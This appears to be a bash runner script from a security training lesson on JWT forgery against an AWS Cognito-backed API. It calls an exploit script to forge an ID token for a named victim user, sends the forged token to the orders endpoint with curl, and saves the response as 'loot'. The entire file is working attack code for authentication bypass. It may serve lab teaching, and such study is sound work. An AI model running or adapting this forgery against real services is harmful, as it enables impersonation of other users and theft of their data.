#!/bin/bash
# =============================================================
# Lesson 2 - JWT forgery runner.
# Forges the token via exploit.py, then hits the authenticated
# endpoint with it. Saves the response to ../../loot/lesson2/.
#
# Usage:
#   export TOKEN_B="<your.own.cognito.idToken>"
#   export VICTIM_USER="reyyynad"
#   # export VICTIM_SUB="<victim-cognito-sub>"   # optional
#   export API="https://YOUR-API-ID.execute-api.us-east-1.amazonaws.com/Stage/orders"
#   bash run.sh
# =============================================================
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
LOOT="$HERE/../../loot/lesson2"
mkdir -p "$LOOT"

if [ -z "${TOKEN_B:-}" ] || [ -z "${VICTIM_USER:-}" ] || [ -z "${API:-}" ]; then
  echo "ERROR: set TOKEN_B, VICTIM_USER and API first." >&2
  echo '  export TOKEN_B="<your.own.cognito.idToken>"' >&2
  echo '  export VICTIM_USER="reyyynad"' >&2
  echo '  export API="https://YOUR-API-ID.execute-api.us-east-1.amazonaws.com/Stage/orders"' >&2
  exit 1
fi

echo "[*] Forging JWT for victim: $VICTIM_USER"
FORGED="$(python3 "$HERE/exploit.py" --quiet)"
if [ -z "$FORGED" ]; then
  echo "ERROR: forger returned empty token." >&2
  exit 2
fi
echo "[*] Forged token (first 60 chars): ${FORGED:0:60}..."

echo "[*] Sending forged request to $API"
HTTP_STATUS=$(curl -s -o "$LOOT/forged_response.json" -w "%{http_code}" \
  -H "Authorization: Bearer $FORGED" "$API")

echo "[*] HTTP $HTTP_STATUS"
echo "[+] Response saved to: $LOOT/forged_response.json"
echo ""
echo "Preview:"
head -c 400 "$LOOT/forged_response.json" || true
echo ""
